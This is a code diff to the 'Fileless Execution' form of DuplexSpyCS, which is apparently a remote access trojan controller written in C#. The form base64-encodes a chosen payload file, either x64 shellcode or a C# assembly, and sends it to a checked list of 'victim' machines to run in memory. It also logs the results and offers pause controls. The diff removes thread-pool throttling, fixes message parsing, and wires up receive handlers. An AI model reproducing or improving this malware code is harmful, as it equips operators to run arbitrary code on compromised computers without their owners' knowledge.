@@ -34,8 +34,8 @@ namespace DuplexSpyCS
 
             if (lsMsg[0] == "fle") //Fileless Execution
             {
-                int nCode = int.Parse(lsMsg[1]);
-                string szMsg = lsMsg[2];
+                int nCode = int.Parse(lsMsg[2]);
+                string szMsg = lsMsg[3];
 
                 Invoke(new Action(() =>
                 {
@@ -44,7 +44,7 @@ namespace DuplexSpyCS
                     if (nCode == 0)
                     {
                         richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
-                        
+
                         if (item == null)
                             return;
 
@@ -53,7 +53,7 @@ namespace DuplexSpyCS
                     else
                     {
                         richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] OK");
-                        
+
                         if (item == null)
                             return;
 
@@ -63,7 +63,7 @@ namespace DuplexSpyCS
             }
         }
 
-        void fnSendPayload(string[] alpArgs, int nThdCnt, byte[] abData)
+        void fnSendPayload(string[] alpArgs, byte[] abData)
         {
             List<clsVictim> lsTarget = new List<clsVictim>();
             Invoke(new Action(() =>
@@ -81,9 +81,6 @@ namespace DuplexSpyCS
 
             string szArgs = string.Join(",", alpArgs.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             string szData = Convert.ToBase64String(abData);
-
-            ThreadPool.SetMinThreads(1, 1);
-            ThreadPool.SetMaxThreads(nThdCnt, nThdCnt);
             foreach (clsVictim v in lsTarget)
             {
                 while (m_bSignalPause)
@@ -98,26 +95,25 @@ namespace DuplexSpyCS
                     break;
                 }
 
-                //ThreadPool.QueueUserWorkItem(x => v.SendCommand($"fle|{szArgs}|{szData}"));
                 if (radioButton1.Checked)
                 {
-                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
+                    v.fnSendCommand(new string[]
                     {
                         "fle",
                         "x64",
                         string.Empty,
                         szData
-                    }));
+                    });
                 }
                 else if (radioButton2.Checked)
                 {
-                    ThreadPool.QueueUserWorkItem(x => v.fnSendCommand(new string[]
+                    v.fnSendCommand(new string[]
                     {
                         "fle",
                         "cs",
                         szArgs,
                         szData,
-                    }));
+                    });
                 }
             }
         }
@@ -127,15 +123,11 @@ namespace DuplexSpyCS
             //Controls
             listView1.FullRowSelect = true;
             listView1.CheckBoxes = true;
-            
+
             toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
             toolStripStatusLabel2.Text = string.Empty;
 
             radioButton1.Checked = true;
-
-            numericUpDown1.Value = 1;
-            numericUpDown1.Minimum = 1;
-            numericUpDown1.Maximum = 100;
 
             //setup
             foreach (clsVictim v in m_lsVictim)
@@ -145,6 +137,8 @@ namespace DuplexSpyCS
                 item.Tag = v;
 
                 listView1.Items.Add(item);
+
+                v.m_listener.ReceivedDecoded += fnRecv;
             }
         }
 
@@ -187,11 +181,10 @@ namespace DuplexSpyCS
                 return;
             }
 
-            int nThdCnt = (int)numericUpDown1.Value;
             string[] alpArgs = szArgs.Split(' ');
             byte[] abData = File.ReadAllBytes(szFileName);
 
-            new Thread(() => fnSendPayload(alpArgs, nThdCnt, abData)).Start();
+            new Thread(() => fnSendPayload(alpArgs, abData)).Start();
         }
         //Pause
         private void button6_Click(object sender, EventArgs e)
@@ -218,6 +211,17 @@ namespace DuplexSpyCS
         private void radioButton1_CheckedChanged(object sender, EventArgs e)
         {
             textBox2.Enabled = !radioButton1.Checked;
+        }
+
+        private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void frmFilelessExec_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            foreach (var victim in m_lsVictim)
+                victim.m_listener.ReceivedDecoded -= fnRecv;
         }
     }
 }
